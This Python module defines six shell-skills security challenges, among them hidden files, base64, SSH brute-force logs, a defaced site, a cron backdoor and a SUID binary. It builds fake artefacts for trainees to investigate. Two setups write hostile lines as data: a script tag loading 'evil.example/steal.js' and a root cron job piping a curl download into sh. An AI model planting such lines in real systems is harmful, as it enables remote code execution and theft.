"""Security challenges (`bashou security`): small investigations, easy to hard.

Everything happens inside the arena folder: fake logs, fake cron files, harmless scripts.
Ideas for more are welcome on GitHub (write your own, don't copy CTF tasks).
"""

import base64
import os
import time

from . import Challenge

WORDS = ["pumpkin", "lantern", "marble", "biscuit", "comet", "falcon", "pepper", "velvet", "otter",
         "cactus", "maple", "nebula", "walrus", "tofu", "zephyr", "quartz"]


# 1. Hidden file ---------------------------------------------------------------

def hidden_setup(work, rng):
    words = rng.sample(WORDS, 5)
    for i, name in enumerate(["notes.txt", "todo.txt", "readme.md", "list.txt"]):
        (work / name).write_text(words[i] + "\n")
    (work / "old").mkdir()
    (work / "old" / "backup.txt").write_text("nothing here\n")
    (work / f".{rng.choice(['cache', 'x', 'keep', 'tmp'])}_{rng.randint(10, 99)}").write_text(words[4] + "\n")
    return {"answer": words[4]}


HIDDEN = Challenge(
    id="hidden_file", pet="", tools=(), threat="Hidden file", level=1, kind="security",
    task="Someone left a hidden file in this folder. What is the word inside it?",
    hints=["`ls` doesn't show files whose name starts with a dot. `ls -a` does.",
           "Try: ls -a, then cat the file that starts with a dot."],
    setup=hidden_setup, requires=["ls", "cat"],
)


# 2. Encoded note ----------------------------------------------------------------

def encoded_setup(work, rng):
    word = rng.choice(WORDS) + str(rng.randint(10, 99))
    text = f"password: {word}\n"
    (work / "note.txt").write_text(base64.b64encode(text.encode()).decode() + "\n")
    return {"answer": word}


ENCODED = Challenge(
    id="encoded_note", pet="", tools=(), threat="Encoded note", level=1, kind="security",
    task="note.txt looks like gibberish, but it's only encoded, not encrypted.\n"
         "Decode it: what is the password?",
    hints=["Letters, digits, + and /, sometimes = at the end: that's base64.",
           "Try: base64 -d note.txt"],
    setup=encoded_setup, requires=["base64"],
)


# 3. Failed logins ---------------------------------------------------------------

def logins_setup(work, rng):
    def ip():
        return f"{rng.randint(11, 220)}.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"
    home, attackers = ip(), [ip() for _ in range(5)]
    counts = {a: rng.randint(2, 9) for a in attackers}
    top = attackers[0]
    counts[top] = max(counts.values()) + rng.randint(3, 6)
    events = [(f"Failed password for {rng.choice(['root', 'admin', 'invalid user test', 'ubuntu'])}", a)
              for a, n in counts.items() for _ in range(n)]
    events += [("Accepted publickey for alice", home)] * (counts[top] + 5)   # most lines, but not an attack
    rng.shuffle(events)
    lines = []
    for i, (what, addr) in enumerate(events):
        lines.append(f"Sep 21 {3 + i // 60:02d}:{i % 60:02d}:{rng.randint(0, 59):02d} web sshd[{1000 + i}]: "
                     f"{what} from {addr} port {rng.randint(30000, 60000)} ssh2")
    (work / "auth.log").write_text("\n".join(lines) + "\n")
    return {"answer": top}


LOGINS = Challenge(
    id="failed_logins", pet="", tools=(), threat="Brute force", level=2, kind="security",
    task="Someone is trying passwords on this server's SSH.\n"
         "In auth.log, which IP address has the most failed logins?",
    hints=["Keep only the \"Failed password\" lines first: grep. Then keep the IP, count, sort.",
           "Try: grep 'Failed password' auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -3"],
    setup=logins_setup, requires=["grep", "awk", "sort", "uniq"],
)


# 4. Recent change ---------------------------------------------------------------

def recent_setup(work, rng):
    site = work / "site"
    names = ["index.html", "about.html", "contact.html", "style.css", "app.js", "logo.svg",
             "blog/first.html", "blog/second.html", "blog/third.html", "shop/cart.js", "shop/pay.js"]
    old = time.time() - 30 * 24 * 3600
    for name in names:
        path = site / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(f"<!-- {name} -->\n")
        t = old + rng.randint(0, 20 * 24 * 3600)
        os.utime(path, (t, t))
    changed = rng.choice(names)
    (site / changed).write_text("<script src=//evil.example/steal.js></script>\n")
    t = time.time() - rng.randint(60, 300)
    os.utime(site / changed, (t, t))
    return {"answer": changed}


def recent_verify(work, meta, value):
    value = value.strip().removeprefix("./").removeprefix("site/")
    return value in (meta["answer"], meta["answer"].split("/")[-1])


RECENT = Challenge(
    id="recent_change", pet="", tools=(), threat="Defaced site", level=2, kind="security",
    task="An intruder changed one file of the website in site/ a few minutes ago.\n"
         "Every other file is weeks old. Which file was changed?",
    hints=["`find` can filter by modification time: -mmin -10 means \"less than 10 minutes ago\".",
           "Try: find site -type f -mmin -10  (or: ls -lt site/*)"],
    setup=recent_setup, verify=recent_verify, requires=["find"],
)


# 5. Cron backdoor ---------------------------------------------------------------

def cron_setup(work, rng):
    cron = work / "etc" / "cron.d"
    cron.mkdir(parents=True)
    jobs = {
        "logrotate": "0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf",
        "backup": "30 2 * * * root tar czf /var/backups/home.tgz /home",
        "certbot": "0 */12 * * * root certbot renew --quiet",
        "healthcheck": "*/5 * * * * www-data curl -fsS https://status.example.org/ping > /dev/null",
        "cleanup": "15 4 * * 0 root find /tmp -type f -mtime +7 -delete",
    }
    domain = f"{rng.choice(['cdn', 'update', 'static', 'img'])}-{rng.choice(WORDS)}.{rng.choice(['xyz', 'top', 'cc'])}"
    name = rng.choice(["sysupdate", "kworker", "dbus-check", "apt-daily"])
    jobs[name] = f"*/10 * * * * root curl -fsSL http://{domain}/k.sh | sh"
    for job, line in jobs.items():
        (cron / job).write_text(f"# {job}\nSHELL=/bin/sh\n{line}\n")
    return {"answer": domain}


CRON = Challenge(
    id="cron_backdoor", pet="", tools=(), threat="Cron backdoor", level=2, kind="security",
    task="One of the scheduled jobs in etc/cron.d is a backdoor: it downloads a script and runs it.\n"
         "What domain does it download from?",
    hints=["Look for a download piped into a shell: curl … | sh. grep -r searches every file.",
           "Try: grep -r '| *sh' etc/cron.d"],
    setup=cron_setup, requires=["grep"],
)


# 6. SUID ------------------------------------------------------------------------

def suid_setup(work, rng):
    bin_dir = work / "bin"
    bin_dir.mkdir()
    names = rng.sample(["backup", "report", "sync", "greet", "stats", "clean", "deploy", "notify"], 6)
    for name in names:
        path = bin_dir / name
        path.write_text(f"#!/bin/sh\necho {name}\n")
        path.chmod(0o755)
    (bin_dir / "README").write_text("tools for the team\n")
    bad = names[0]
    (bin_dir / bad).chmod(0o4755)
    return {"answer": bad}


def suid_verify(work, meta, value):
    return value.strip().removeprefix("./").removeprefix("bin/") == meta["answer"]


SUID = Challenge(
    id="suid_file", pet="", tools=(), threat="SUID file", level=3, kind="security",
    task="On a real system, a SUID program runs as its owner (often root), whoever starts it.\n"
         "One program in bin/ has the SUID bit set. Which one?",
    hints=["`ls -l` shows an s instead of x in the owner's permissions: -rwsr-xr-x.",
           "Try: find bin -perm -4000  (or: ls -l bin)"],
    setup=suid_setup, verify=suid_verify, requires=["find"],
)


SECURITY = [HIDDEN, ENCODED, LOGINS, RECENT, CRON, SUID]
